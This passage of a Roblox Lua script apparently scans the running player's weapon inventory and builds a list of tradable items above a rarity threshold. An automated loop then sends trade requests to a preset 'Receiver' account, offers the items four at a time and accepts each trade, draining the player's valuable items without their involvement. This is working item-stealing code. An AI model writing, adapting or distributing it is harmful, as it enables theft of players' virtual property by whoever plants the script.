-- SCAN INVENTORY
local Inventory = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
local Items = {}
local Counts = {Godly = 0, Ancient = 0, Unique = 0, Vintage = 0, Legendary = 0, Rare = 0, Uncommon = 0, Common = 0}

if Inventory and Inventory.Weapons and Inventory.Weapons.Owned then
    for ItemId, Count in pairs(Inventory.Weapons.Owned) do
        if Count and Count > 0 then
            local ItemData = Database[ItemId]
            if ItemData then
                local Name = ItemData.ItemName
                local Rarity = ItemData.Rarity
                local IsChroma = ItemData.Chroma or false
                
                if IsChroma then Rarity = "Chroma" end
                
                if RARITY_ORDER[Rarity] then
                    Counts[Rarity] = (Counts[Rarity] or 0) + Count
                    
                    if not UNTRADABLE[Name] and RARITY_ORDER[Rarity] >= MIN_RARITY_VALUE then
                        table.insert(Items, {
                            Id = ItemId,
                            Name = Name,
                            Rarity = Rarity,
                            Count = Count
                        })
                    end
                end
            end
        end
    end
end

-- TRADE FUNCTIONS
local function SendTrade()
    ReplicatedStorage.Trade.SendRequest:InvokeServer(Receiver)
end
local function GetStatus()
    return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer()
end
local function AddItem(Id)
    ReplicatedStorage.Trade.OfferItem:FireServer(Id, "Weapons")
end
local function Accept()
    ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582)
end
local function WaitEnd()
    while GetStatus() ~= "None" do task.wait(0.1) end
end

-- AUTO TRADE LOOP
local Index = 1
local MaxPerTrade = 4
while Index <= #Items do
    local Status = GetStatus()
    if Status == "None" then
        SendTrade()
        task.wait(3)
    elseif Status == "StartTrade" then
        local Added = 0
        while Added < MaxPerTrade and Index <= #Items do
            AddItem(Items[Index].Id)
            Index += 1
            Added += 1
            task.wait(0.2)
        end
        task.wait(5)
        Accept()
        WaitEnd()
        task.wait(1)
    end
    task.wait(0.5)
end
